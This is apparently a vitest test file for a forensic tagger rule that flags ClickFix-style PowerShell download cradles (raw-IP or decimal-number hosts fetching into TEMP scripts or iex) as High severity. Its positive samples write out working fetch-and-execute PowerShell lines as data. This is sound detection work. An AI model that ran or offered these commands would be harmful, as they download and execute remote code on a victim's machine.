import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { compileText } from "../../src/analysis/taggerStore.js";
import { runTagger, applyToForensicEvent } from "../../src/analysis/tagger.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";

// #1947: the real ClickFix paste — a PowerShell fetch from a bare-number or raw-IPv4 host into a temp
// script (or straight into iex) — reached the timeline as Medium noise and no finding cited it. The
// bundled rule grades that shape High before the AI reads the row. A named-host download, a raw-IP
// download to an ordinary path, and the lab's echo stand-in stay untouched.
const RULESET = compileText(
  readFileSync(fileURLToPath(new URL("../../data/tags.yaml", import.meta.url)), "utf8"),
);
const RULE_ID = "win_clickfix_download_cradle";

type Field = "commandLine" | "description" | "message";

function ev(field: Field, text: string): ForensicEvent {
  return {
    id: "e1",
    timestamp: "2026-06-01T00:00:00Z",
    description: field === "description" ? text : "Process created",
    ...(field === "description" ? {} : { [field]: text }),
    severity: "Info",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    sources: ["Sysmon"],
  };
}

function hit(field: Field, text: string) {
  const res = runTagger([ev(field, text)], RULESET);
  return res.perEvent.find((e) => e.eventId === "e1");
}

describe("bundled data/tags.yaml — ClickFix download cradle (#1947)", () => {
  it("loads the rule with its tags, techniques and High severity", () => {
    const rule = RULESET.rules.find((r) => r.id === RULE_ID);
    expect(rule).toBeDefined();
    expect(rule?.severity).toBe("High");
    expect(rule?.tags).toEqual(expect.arrayContaining(["download-cradle", "initial-access"]));
    expect(rule?.mitre).toEqual(expect.arrayContaining(["T1105", "T1059.001", "T1204.004"]));
  });

  describe("grades High", () => {
    const POSITIVES: [string, Field, string][] = [
      [
        "decimal-number host into a TEMP script (Sysmon commandLine)",
        "commandLine",
        'powershell.exe -c "iwr http://3232235777/s -OutFile $env:TEMP\\s.ps1; & $env:TEMP\\s.ps1"',
      ],
      [
        "the same paste in description only (Hayabusa / console-history shape)",
        "description",
        "Shell command: iwr http://3232235777/s -OutFile $env:TEMP\\s.ps1; & $env:TEMP\\s.ps1",
      ],
      [
        "raw IPv4 host piped into a TEMP script",
        "commandLine",
        "powershell -w hidden -c irm http://203.0.113.5/a | Out-File $env:TEMP\\a.ps1",
      ],
      [
        "raw IPv4 host with a port straight into iex (script-block message)",
        "message",
        "iex (irm http://203.0.113.5:8080/a)",
      ],
    ];

    it.each(POSITIVES)("%s", (_name, field, text) => {
      const res = hit(field, text);
      expect(res?.ruleIds).toContain(RULE_ID);
      expect(res?.severity).toBe("High");
      expect(res?.tags).toEqual(expect.arrayContaining(["download-cradle", "initial-access"]));
    });

    it("raises an Info row to High and unions the techniques", () => {
      const event = ev("commandLine", POSITIVES[0][2]);
      const res = runTagger([event], RULESET).perEvent.find((e) => e.eventId === "e1");
      expect(res).toBeDefined();
      const out = applyToForensicEvent(event, res!);
      expect(out.severity).toBe("High");
      expect(out.mitreTechniques).toEqual(expect.arrayContaining(["T1105", "T1059.001", "T1204.004"]));
    });
  });

  describe("leaves unchanged", () => {
    const NEGATIVES: [string, string][] = [
      [
        "an ordinary download from a named host",
        "iwr https://download.example.com/tool.zip -OutFile C:\\Tools\\tool.zip",
      ],
      ["a named-host script into TEMP", "iwr https://cdn.example.com/s.ps1 -OutFile $env:TEMP\\s.ps1"],
      [
        "a raw-IP download to a non-temp, non-script path",
        "iwr http://10.0.0.5/pkg.msi -OutFile C:\\Installs\\pkg.msi",
      ],
      ["the lab's echo stand-in (no sink)", "cmd /c echo powershell iwr http://3232235777/s"],
      [
        "a hostname that starts with a dotted quad",
        "iwr http://1.2.3.4.example.com/s -OutFile $env:TEMP\\s.ps1",
      ],
    ];

    it.each(NEGATIVES)("%s", (_name, text) => {
      expect(hit("commandLine", text)?.ruleIds ?? []).not.toContain(RULE_ID);
      expect(hit("description", text)?.ruleIds ?? []).not.toContain(RULE_ID);
    });
  });
});
